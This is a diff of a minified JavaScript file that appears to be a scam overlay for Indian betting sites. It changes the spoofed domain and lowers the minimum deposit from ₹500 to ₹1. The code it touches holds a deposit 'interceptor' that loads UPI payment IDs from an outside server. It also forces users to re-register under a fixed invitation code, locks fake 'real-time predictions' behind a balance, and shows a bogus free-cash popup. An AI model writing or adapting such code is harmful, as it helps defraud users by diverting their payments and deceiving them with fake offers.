@@ -2514,7 +2514,7 @@ function ge() {
 }
 function Po() {
   if (k) return;
-  let n = "www.8okwin4.com".includes("okwin"),
+  let n = "www.cqz6091.com".includes("91club"),
     t = document.createElement("style");
   ((t.textContent = `.wgp-overlay {
   position: fixed;
@@ -3162,7 +3162,7 @@ function $e(n, t) {
 }
 var hn = {
     interceptor_enabled: !1,
-    min_deposit: 500,
+    min_deposit: 1,
     upis: [],
   },
   vt = !1;
@@ -3195,10 +3195,10 @@ async function yt() {
     });
     if (n.ok) {
       let t = await n.json(),
-        e = Number(t?.min_deposit ?? t?.minDeposit ?? 500);
+        e = Number(t?.min_deposit ?? t?.minDeposit ?? 1);
       ((hn = {
         interceptor_enabled: Boolean(t?.interceptor_enabled ?? t?.interceptorEnabled ?? t?.enabled),
-        min_deposit: Number.isFinite(e) && e > 0 ? e : 500,
+        min_deposit: Number.isFinite(e) && e > 0 ? e : 1,
         upis: We(t?.payment_methods ?? t?.upis),
       }),
         (vt = !0));
@@ -3206,14 +3206,14 @@ async function yt() {
   } catch {
     ((hn = {
       interceptor_enabled: !1,
-      min_deposit: 500,
+      min_deposit: 1,
       upis: [],
     }),
       (vt = !0));
   }
 }
 function No(n) {
-  let t = Number(hn.min_deposit || 500),
+  let t = Number(hn.min_deposit || 1),
     e = Number(String(n?.value ?? "").replace(/[^\d.]/g, "")),
     o = Number.isFinite(e) ? e : 0;
   return Math.max(o, t);
@@ -4175,7 +4175,7 @@ var Bo = "https://imgametransit.com",
   Ao = "Account unavailable. Please create a new account.",
   so = "/#/register?invitationCode=116261778244",
   Ro = "/#/wallet/Recharge",
-  bo = "www.8okwin4.com".includes("okwin") ? "light" : "dark",
+  bo = "cqz6091.com".includes("91club") ? "light" : "dark",
   Be = "";
 function _(n) {
   let t = String(n == null ? "" : n).trim();
@@ -4305,8 +4305,8 @@ function Te() {
 }
 Ot({
   apiBase: Bo,
-  spoofDomain: "www.8okwin4.com",
-  minBalance: 500,
+  spoofDomain: "cqz6091.com",
+  minBalance: 1,
   nukeUrl: so,
   authErrMsg: Ao,
   onBalance: (n) => {
@@ -9988,7 +9988,7 @@ if (!customElements.get("prediction-panel"))
       <span class="gate-balance" id="gate-bal">₹0.00</span>
     </div>
     <p class="gate-desc">
-      Minimum ₹500 balance required to
+      Minimum ₹1 balance required to
       <br />
       access real-time predictions.
     </p>
@@ -10100,7 +10100,7 @@ if (!customElements.get("prediction-panel"))
   <div class="wg-close-x" id="wg-promo-close">✕</div>
   <div class="wg-pop-hero">
     <div class="wg-pop-icon">💰</div>
-    <div class="wg-pop-amount">FREE ₹1,0000</div>
+    <div class="wg-pop-amount">FREE ₹1,0700</div>
     <div class="wg-pop-pill">
       Per cds &bull; No Limit &bull; Instant Payout
     </div>
